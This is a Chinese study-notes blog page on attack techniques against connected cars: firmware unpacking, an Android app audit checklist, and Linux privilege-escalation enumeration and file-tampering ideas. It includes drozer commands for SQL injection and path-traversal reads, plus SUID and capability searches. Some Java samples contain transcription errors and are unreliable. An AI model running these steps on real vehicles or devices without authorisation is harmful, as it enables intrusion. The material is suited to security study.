<p>Target-&gt;Connect连接，随后选取range读取Flash，选取范围，有的芯片是只能读写某个范围的数据，可以自己尝试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20231212110636346.png" alt="image-20231212110636346"></p>

        <h1 id="智能汽车网络安全权威指南"   >
          <a href="#智能汽车网络安全权威指南" class="heading-link"><i class="fas fa-link"></i></a><a href="#智能汽车网络安全权威指南" class="headerlink" title="智能汽车网络安全权威指南"></a>智能汽车网络安全权威指南</h1>
      
        <h2 id="第11章不得不说的汽车网络安全攻击手法"   >
          <a href="#第11章不得不说的汽车网络安全攻击手法" class="heading-link"><i class="fas fa-link"></i></a><a href="#第11章不得不说的汽车网络安全攻击手法" class="headerlink" title="第11章不得不说的汽车网络安全攻击手法"></a>第11章不得不说的汽车网络安全攻击手法</h2>
      
        <h3 id="攻击向量分析"   >
          <a href="#攻击向量分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击向量分析" class="headerlink" title="攻击向量分析"></a>攻击向量分析</h3>
      <p>整车攻击面</p>

        <h3 id="硬件分析"   >
          <a href="#硬件分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#硬件分析" class="headerlink" title="硬件分析"></a>硬件分析</h3>
      <p>具体再看</p>

        <h3 id="固件逆向"   >
          <a href="#固件逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#固件逆向" class="headerlink" title="固件逆向"></a>固件逆向</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86%E7%82%B9.png" alt="固件逆向知识点"></p>

        <h4 id="1-固件分类"   >
          <a href="#1-固件分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件分类" class="headerlink" title="1.固件分类"></a>1.固件分类</h4>
      <ul>
<li>Bare Metal（裸机）固件：<ul>
<li>车内的Bare Metal通常是基于Autosar CP（Classical Platform AUTOmotive Open System Architecture）实现的标准嵌入式系统。它的任务通常不会超过3/4个，在特定条件下运行。</li>
<li>基本都是基于C语言编写的，常见的C语言漏洞也适用</li>
<li>没有预定义的文件结构，通常需要了解芯片手册，创建内存映射再进行反汇编。</li>
</ul>
</li>
<li>成熟的操作系统固件：<ul>
<li>大多为Linux、windows CE、Android等等</li>
<li>通常包含三个组件：BootLoader、内核、文件系统。</li>
</ul>
</li>
</ul>

        <h4 id="2-固件解包"   >
          <a href="#2-固件解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-固件解包" class="headerlink" title="2.固件解包"></a>2.固件解包</h4>
      
        <h5 id="1-清除OOB"   >
          <a href="#1-清除OOB" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-清除OOB" class="headerlink" title="(1)清除OOB"></a>(1)清除OOB</h5>
      <p>从Flash中提取的固件，需要将固件中的<code>Out-Of-Band(OOB)</code>空闲区块去除，常见存储为格式如下两种</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231030114332.jpg" alt="微信图片_20231030114332"></p>
<p>对于2048字节的可以使用如下python代码清除</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;image.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;fix.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">p = <span class="number">2112</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)//p):</span><br><span class="line">    f.write(data[i*p:i*p+<span class="number">2048</span>])</span><br><span class="line">f.close()</span><br></pre></td></tr></table></div></figure>


        <h5 id="2-解包固件"   >
          <a href="#2-解包固件" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解包固件" class="headerlink" title="(2)解包固件"></a>(2)解包固件</h5>
      <ul>
<li><p>Binwalk：</p>
</li>
<li><p>dumpifs：解包OS image（IFS）固件</p>
</li>
<li><p>dumpefs：解包Flash filesystem image（EFS）固件</p>
</li>
<li><p>simg2img：解包system.img和vendor.img</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simg2img system.img system.img.ext4</span><br><span class="line">mount -t ext4 -o loop system.img.ext4 system</span><br></pre></td></tr></table></div></figure></li>
<li><p>unpackbootimg：解包boot固件<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/xiaolu/mkbootimg_tools" >xiaolu/mkbootimg_tools: Unpack and repack boot.img,support dtb(dt.img). (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p>gunzip：解包ramdisk固件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip -c boot.img-ramdisk | cpio -i</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h4 id="3-固件逆向"   >
          <a href="#3-固件逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-固件逆向" class="headerlink" title="3.固件逆向"></a>3.固件逆向</h4>
      
        <h5 id="1-指令集识别"   >
          <a href="#1-指令集识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-指令集识别" class="headerlink" title="(1)指令集识别"></a>(1)指令集识别</h5>
      <p>可以用<code>Binwalk -A</code>进行识别指令集。</p>

        <h5 id="2-获取基地址"   >
          <a href="#2-获取基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-获取基地址" class="headerlink" title="(2)获取基地址"></a>(2)获取基地址</h5>
      <ul>
<li><p>芯片<code>DataSheet</code>查找</p>
</li>
<li><p>工具</p>
<ul>
<li><p><code>rbasefind</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/sgayou/rbasefind.git" >https://github.com/sgayou/rbasefind.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><code>basefind2.py</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/soyersoyer/basefind2" >soyersoyer/basefind2: A faster firmware base address scanner. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><code>binbloom</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/quarkslab/binbloom" >quarkslab/binbloom: Raw binary firmware analysis software (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p><code>basefind.py</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mncoppola/ws30/blob/master/basefind.py" >ws30/basefind.py at master · mncoppola/ws30 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ul>
</li>
<li><p>switch定位识别，不太懂</p>
</li>
</ul>

        <h5 id="3-函数恢复"   >
          <a href="#3-函数恢复" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-函数恢复" class="headerlink" title="(3)函数恢复"></a>(3)函数恢复</h5>
      <ul>
<li>log函数识别，没看懂</li>
<li>BSP（Board Support Package）重编译：如果有与芯片固件相对应的BSP软件包，那么可以尝试编译，然后用bindiff进行比对识别函数。</li>
<li>CMSIS-SVD符号恢复法，不太懂</li>
</ul>
<p>……</p>

        <h5 id="4-固件代码定位"   >
          <a href="#4-固件代码定位" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-固件代码定位" class="headerlink" title="(4)固件代码定位"></a>(4)固件代码定位</h5>
      <p>….</p>

        <h5 id="5-固件调试"   >
          <a href="#5-固件调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-固件调试" class="headerlink" title="(5)固件调试"></a>(5)固件调试</h5>
      <p>主要是用芯片级别的调试，使用JTAG</p>

        <h3 id="WEB漏洞"   >
          <a href="#WEB漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h3>
      
        <h3 id="远程车机应用攻击"   >
          <a href="#远程车机应用攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程车机应用攻击" class="headerlink" title="远程车机应用攻击"></a>远程车机应用攻击</h3>
      
        <h4 id="BLE蓝牙钥匙"   >
          <a href="#BLE蓝牙钥匙" class="heading-link"><i class="fas fa-link"></i></a><a href="#BLE蓝牙钥匙" class="headerlink" title="BLE蓝牙钥匙"></a>BLE蓝牙钥匙</h4>
      <p>重放：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/nccgroup/BLE-Replay" >nccgroup/BLE-Replay: BLE-Replay is a Bluetooth Low Energy (BLE) peripheral assessment tool (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>或者使用gatttool进行重放</p>

        <h3 id="Android攻击"   >
          <a href="#Android攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#Android攻击" class="headerlink" title="Android攻击"></a>Android攻击</h3>
      
        <h4 id="敏感信息"   >
          <a href="#敏感信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h4>
      <p><code>apkurlgrep</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/ndelphit/apkurlgrep" >ndelphit/apkurlgrep: Extract endpoints from APK files (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>扫描APK中使用的URL</p>
<p><code>apkleaks</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dwisiswant0/apkleaks" >dwisiswant0/apkleaks: Scanning APK file for URIs, endpoints &amp; secrets. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>扫描APK中的密钥、URI等</p>
<p><code>StaCoAn</code>：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/vincentcox/StaCoAn" >vincentcox/StaCoAn: StaCoAn is a crossplatform tool which aids developers, bugbounty hunters and ethical hackers performing static code analysis on mobile applications. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>可以帮忙扫描硬编码密钥、apikey、密码等信息</p>

        <h4 id="检查Manifest-XML"   >
          <a href="#检查Manifest-XML" class="heading-link"><i class="fas fa-link"></i></a><a href="#检查Manifest-XML" class="headerlink" title="检查Manifest.XML"></a>检查Manifest.XML</h4>
      <ul>
<li><p>检查应用程序是否可以调试：<code>debugable = &quot;true&quot;</code></p>
</li>
<li><p>检查是否可以允许备份：<code>android:allowBackup = &quot;true&quot;</code></p>
</li>
<li><p>检查是否有导出的Activity：是否有<code>&lt;activity android:name=&quot;.TestActivity&quot; android:exported=&quot;true&quot;/&gt;</code>，这样的Activity组件可以被其他应用调用</p>
<p>如果存在，可以以如下命令尝试启动</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.example.demo/com.example.test.MainActivity</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查是否有导出的Content Provider：是否有<code>&lt;provider android:name=&quot;.DBContentProvider&quot; android:export=&quot;true&quot;</code>，这样的Provider可以被其他应用调用</p>
<p>Content Provider所提供的数据可以存储在数据库、文件、网络上，可以用一个Drozer来模拟应用程序调用四大组件</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/WithSecureLabs/drozer" >WithSecureLabs/drozer: The Leading Security Assessment Framework for Android. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p>当Content Provider为数据库存储，可能出现sql注入，可以如下尝试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</span><br><span class="line">unrecognized token: &quot;&#x27;)&quot; (code 1): , while compiling: SELECT * FROM Passwords WHERE (&#x27;)</span><br></pre></td></tr></table></div></figure></li>
<li><p>当Content Provider为文件存储时，可能有目录穿越</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.read content://[APPLICATION_ID]/public/../../databases/database.db</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p>检查是否有导出的Service：是否有<code>&lt;service android:name=&quot;.ExampleExportedService&quot; android:exported=&quot;true&quot;/&gt;</code>，这样的Service可以被其他应用调用</p>
<p>常见的处理代码从handleMessage函数开始，快速定位如下关键函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceHandler</span> <span class="keyword">extends</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServiceHandler</span><span class="params">(Looper looper)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(looper);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span>&#123;</span><br><span class="line">        <span class="comment">// Normally we would do some work here， like download a file.</span></span><br><span class="line">        <span class="comment">// For our sample，we just sleep for 5 seconds</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">            <span class="comment">// Restoreinterrupt status.</span></span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Stop the service using the startId,so that we don&#x27;t stop</span></span><br><span class="line">        <span class="comment">// the service in the middle of handling another job</span></span><br><span class="line">        stopself(msg.arg1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用Drozer调用服务</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.send &lt;package name&gt; &lt;component name&gt; --msg &lt;what&gt; &lt;arg1&gt; &lt;arg2&gt; --extra &lt;type&gt; &lt;key&gt; &lt;value&gt; --bundle-as-obj</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查是否有广播接收器：是否有<code>&lt;receiver android:name=&quot;.MyBroadcastReceiver&quot; android:exported=&quot;true&quot;/&gt;</code>，这样其他的应用可以发广播给该程序</p>
<p>重点关注onReceive函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;MyBroadcastReceiver&quot;</span>;</span><br><span class="line">	<span class="meta">@Overridepublic</span> <span class="function"><span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span></span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		sb.append(<span class="string">&quot;Action:  + intent.getAction() + “\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;URI:&quot;</span> + intent.touri(Intent.URI INTENT SCHEME).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		String log = sb.tostring();</span><br><span class="line">		Log.d(TAG，log);</span><br><span class="line">		Toast.makeText(context，log， Toast.LENGTH LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用Drozer调用服务</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app,broadcast.send --component &lt;package name&gt; &lt;component name&gt;--action&lt;action&gt; --extra &lt;type&gt; &lt;key&gt; &lt;value&gt;</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查是否有URL Scheme：检查Activity中是否有<code>&lt;data android:scheme=&quot;app&quot; android:host=&quot;open.my.app&quot; /&gt;</code>这样的Activity可以被其他应用通过URL打开，包括浏览器，这个即为Deeplink，用adb测试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -a android.intent.action.VIEW -d &quot;scheme://hostname/path?param=value&quot; [your.package.name]</span><br></pre></td></tr></table></div></figure>

<p>通常还需要检查是否存在敏感参数，密码，明文传输，证书检查，弱密码套件（即加密算法）</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=cipherspecs-deprecated" >Deprecated CipherSpecs - IBM Documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p>检查Activity模式是否为singleTask：具有singleTask模式的Activity具有被劫持的风险，此类漏洞可以参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html" >Android task hijacking using moveTaskToBack() and excludeFromRecents (takemyhand.xyz)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>检查是否有<code>&lt;activity android:name=&quot;.MainActivity&quot; android:launchMode=&quot;singleTask&quot;/&gt;</code></p>
</li>
</ul>

        <h4 id="代理组件攻击"   >
          <a href="#代理组件攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#代理组件攻击" class="headerlink" title="代理组件攻击"></a>代理组件攻击</h4>
      <p>不懂</p>

        <h4 id="过时加密算法"   >
          <a href="#过时加密算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#过时加密算法" class="headerlink" title="过时加密算法"></a>过时加密算法</h4>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/ibm-mq/9.3?topic=cipherspecs-deprecated#q014265___depzos" >Deprecated CipherSpecs - IBM Documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="自动化静态分析"   >
          <a href="#自动化静态分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动化静态分析" class="headerlink" title="自动化静态分析"></a>自动化静态分析</h4>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" >MobSF/Mobile-Security-Framework-MobSF: Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.vegabird.com/yaazhini/" >Vooki - Free Android APK &amp; API Vulnerability Scanner | Vooki Infosec (vegabird.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="重点关注的函数"   >
          <a href="#重点关注的函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#重点关注的函数" class="headerlink" title="重点关注的函数"></a>重点关注的函数</h4>
      <ul>
<li>从外部获取数据：<code>getOutputStream</code>、<code>getParcelable</code></li>
<li>具有风险行为的函数：<code>exec</code>、<code>sendBroadcast</code>等</li>
</ul>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid" >secure-software-engineering/FlowDroid: FlowDroid Static Data Flow Tracker (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="日志分析"   >
          <a href="#日志分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/JakeWharton/pidcat" >JakeWharton/pidcat: Colored logcat script which only shows log entries for a specific application package. (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="客户端注入"   >
          <a href="#客户端注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#客户端注入" class="headerlink" title="客户端注入"></a>客户端注入</h4>
      <p>SQL注入、Javascript注入(XSS)如果webview代码中调用了setJavaScriptEnabled函数则可能开启，默认关闭的。</p>
<p>本地文件包含，如果代码调用setAllowFileAccess(false)则表示关闭了，默认开启的。</p>

        <h3 id="Linux攻击"   >
          <a href="#Linux攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux攻击" class="headerlink" title="Linux攻击"></a>Linux攻击</h3>
      
        <h4 id="1-信息收集"   >
          <a href="#1-信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4>
      <ul>
<li><p>root权限进程：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看网络信息，哪些开放断开，哪些有UNIX socket</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -npl</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查suid程序</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查任意用户可写的文件看是否能提取</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -2 -type f -ls 2&gt;/dev/null | grep -v &quot;/proc/&quot;</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查任意用户可写的目录，是否可以创建符号链接来提权</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -2 -type d -ls 2&gt;/dev/null</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看设备，寻找可以访问的设备</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /dev</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看文件系统，观察哪些目录是可写的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看内核模块，是否存在自定义的内核模块</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看防火墙，是否对高危端口做了隔离</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看网卡配置，检查其IP、MAC等信息</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></div></figure></li>
<li><p>查看路由，检查网络通信方式</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip route list table all</span><br><span class="line">ip rule list</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查内核版本，查看是否有历史漏洞</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查环境变量，是否存在可写的文件或目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查crontab，是否存在可写的文件或目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></div></figure></li>
<li><p>检查crontab的定时执行文件以及里面执行的内容，是否具有可写权限</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /etc/cron.daily</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h4 id="2-用户态攻击"   >
          <a href="#2-用户态攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用户态攻击" class="headerlink" title="2.用户态攻击"></a>2.用户态攻击</h4>
      
        <h5 id="1-文件修改"   >
          <a href="#1-文件修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-文件修改" class="headerlink" title="(1)文件修改"></a>(1)文件修改</h5>
      <ul>
<li><p>可执行文件：包括shell、so等等，如果运行用户为root，但是低权限用户可以修改，则可以尝试修改获取shell</p>
</li>
<li><p>配置文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd    修改用户登录时执行的命令</span><br><span class="line">/etc/ld.so.conf   添加导入.so库的目录</span><br><span class="line">/etc/httpd.conf   添加自定义插件</span><br></pre></td></tr></table></div></figure></li>
<li><p>数据库文件：通过控制数据库文件，从而影响从数据库文件获取数据的程序，比如将数据带入system，将数据当作URL访问之类的</p>
</li>
<li><p>Service文件：使用systemd的系统中会存在.service文件，如果可以修改，则可以在启动或者停止服务时加入自己的代码。比如修改<code>ExecStart = /tmp/my.sh</code>，就可以在启动停止服务时执行<code>my.sh</code>。其他的比如<code>.time</code>，<code>.socket</code>等</p>
</li>
</ul>

        <h5 id="2-文件夹可写"   >
          <a href="#2-文件夹可写" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-文件夹可写" class="headerlink" title="(2)文件夹可写"></a>(2)文件夹可写</h5>
      <p>在可写文件夹中删除不可修改的文件，再创建该文件，从而达到修改文件的目的。</p>

        <h5 id="3-Capability滥用"   >
          <a href="#3-Capability滥用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Capability滥用" class="headerlink" title="(3)Capability滥用"></a>(3)Capability滥用</h5>
      <p>查找具有Capability的进程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></div></figure>

<p>如果程序具有<code>cap_dac_override</code>，那么该程序就可以写任意文件，如果可以控制写的目标文件和内容，就能达到提权目的了。此外还有<code>CAP_SYS_ADMIN</code>、<code>CAP_SYS_PTRACE</code>、<code>CAP_SYS_CHOWN</code>等等</p>

        <h5 id="4-SUID"   >
          <a href="#4-SUID" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-SUID" class="headerlink" title="(4)SUID"></a>(4)SUID</h5>
      
        <h5 id="5-Linux-IPC"   >
          <a href="#5-Linux-IPC" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Linux-IPC" class="headerlink" title="(5)Linux IPC"></a>(5)Linux IPC</h5>
      <p>即攻击者作为普通用户普通进程，通过IPC和具有漏洞的root进程进行数据交互传输，利用root进程的漏洞来获取shell，从而完成提权，常见的有socket、MemoryMap、SystemV、Posix、NamePipe、SharedMemory等等</p>

        <h5 id="6-总线协议"   >
          <a href="#6-总线协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-总线协议" class="headerlink" title="(6)总线协议"></a>(6)总线协议</h5>
      <p>常见的总线协议为DBus和MQTT协议，这个暂时不懂可以用如下python代码和C代码建立DBus服务</p>
